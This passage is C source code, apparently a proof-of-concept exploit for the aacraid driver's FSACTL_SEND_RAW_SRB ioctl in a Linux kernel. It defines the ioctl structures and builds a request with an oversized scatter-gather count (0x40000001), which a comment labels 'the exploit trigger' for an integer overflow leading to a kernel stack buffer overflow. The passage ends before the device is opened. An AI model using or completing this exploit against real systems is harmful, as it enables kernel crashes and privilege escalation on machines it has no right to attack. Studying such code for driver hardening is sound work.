 * definitions from kernel headers for a specific target.
 * The IOCTL command value is also system-dependent.
 */
#define FSACTL_SEND_RAW_SRB _IOWR('f', 20, struct user_aac_srb)

struct user_sgentry {
    uint32_t addr;
    uint32_t count;
};

struct user_sgmap {
    uint32_t count;
    struct user_sgentry sg[1];
};

struct user_aac_srb {
    uint32_t count;       /* Total size of this structure */
    uint32_t channel;
    uint32_t id;
    uint32_t lun;
    uint32_t timeout;
    uint32_t flags;
    uint32_t cdb_size;
    char cdb[16];
    struct user_sgmap sg;
};


int main(void)
{
    int fd;
    // The size must be large enough to include the base struct and at least one sg entry
    // but small enough to not be rejected by the initial size checks.
    const size_t fibsize = offsetof(struct user_aac_srb, sg.sg[1]);

    struct user_aac_srb *srb = malloc(fibsize);
    memset(srb, 0, fibsize);

    srb->count = fibsize;

    /*
     * This is the exploit trigger. A large value for sg.count causes an
     * integer overflow in the kernel's size validation check, allowing it to pass.
     * The kernel then uses this large value in a loop, causing a stack buffer overflow.
     * For example, on a 32-bit system, a calculation like:
     *   size = BASE + (sg.count * sizeof(entry))
     * can wrap around if sg.count is sufficiently large.
     */
    srb->sg.count = 0x40000001; // Example large value to cause overflow

    // Open a handle to the aacraid device
